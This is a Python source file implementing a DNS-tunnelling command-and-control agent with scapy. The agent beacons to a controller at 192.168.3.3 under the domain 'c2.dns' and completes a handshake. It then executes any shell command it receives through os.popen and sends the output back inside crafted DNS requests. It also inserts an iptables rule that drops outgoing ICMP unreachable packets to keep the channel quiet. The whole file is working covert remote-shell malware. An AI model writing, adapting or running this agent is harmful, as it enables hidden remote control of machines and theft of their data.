from scapy.all import sniff
from scapy.layers.dns import *
from scapy.layers.inet import *
from dns_utils import *
from datetime import datetime
from time import sleep
import os, logging, sys


class C2_DNS_Agent(object):
    '''
    init wait for an answer from beacon
    once recived an answer, preform a handshake
    '''
    def __init__(self, ip, domain, logger: logging, iface, max_payload_size=95, ack=10):
        os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
        self.master_ip = ip
        self.max_payload_size = max_payload_size
        self.ack = ack
        self.domain = domain
        self.logger = logger
        self.DNS_Comm = DNS_Comm(domain, iface, logger, max_payload_size, ack, ip=ip)
        while not self.__HandShack(handshack):  
             pass
        
        self.logger.info("[!] Connection Established")


    def __HandShack(self, handshack: list, timeout=5) -> bool:
            current_time = datetime.now() 
            self.__Beaconning(handshack[BEACON])
            result = self.DNS_Comm.Recive(timeout=timeout)
            if result is not None:
                payload, pkt = result
                self.logger.debug(f"[d] payload recieved after procesing: {payload}")
                if payload and handshack[ACTIVATE] in payload:
                    self.__Beaconning(handshack[READY])
                    return True
            
            elapsed_time = datetime.now() - current_time
            if elapsed_time.total_seconds() - 3 > 0:
                sleep(elapsed_time.total_seconds() - 3)

            return False

    def __Beaconning(self, beacon_massage: bytes):
            self.logger.debug(f"[d] Send {beacon_massage}")
            req_pkt = self.DNS_Comm.Craft_Request(beacon_massage)
            Send(req_pkt, hold=True)
                
    def Activate(self):
        while True:
            self.logger.info("[!] Waiting for Commands:")
            filter = f"udp port 53 and host {self.master_ip}"
            timeout = 30
            result = self.DNS_Comm.Recive(timeout=timeout, filter=filter)
            if result is not None:
                payload, pkt = result
                cmd = payload[DATA].decode()
                self.logger.debug(f"Recieved: {payload}")
                try:
                    output_cm = os.popen(cmd + " 2>&1").read().encode()
                except UnicodeDecodeError:
                    if 'cat' in cmd:
                        file = cmd.split(' ')[1]
                    with open(file, 'rb') as fd:
                        output_cm = fd.read()
                self.logger.debug(f"[d] Command output:\n{output_cm}")
                pkt_list = self.DNS_Comm.Craft_Request(output_cm)
                
                for i, pkt in enumerate(pkt_list):
                    if self.DNS_Comm.reliable_send(i, pkt):
                        self.logger.debug(f"[d] packet number {i} sent")
                    else:
                        self.logger.error(f"[e] Failed to send packet num {i} from {len(pkt_list)}")
                        return CONNECTION_FAILED #enitiating new connection 
    
   
    
    def __del__(self):
        os.system("iptables -D OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
        sys.exit()

if '__main__' == __name__:
    beacon_message = b"Hello_Master!"
    activate_message = b"Hello_Son"
    ack_message = b"waiting_for_orders"
    domain = "c2.dns"
    server_ip = "192.168.3.3"
    iface = 'eth0'
    handshack = [beacon_message, activate_message, ack_message]
    logger = Create_Logger_Object(logging.DEBUG)
    agant = C2_DNS_Agent(server_ip, domain, logger, iface)
    agant.Activate()
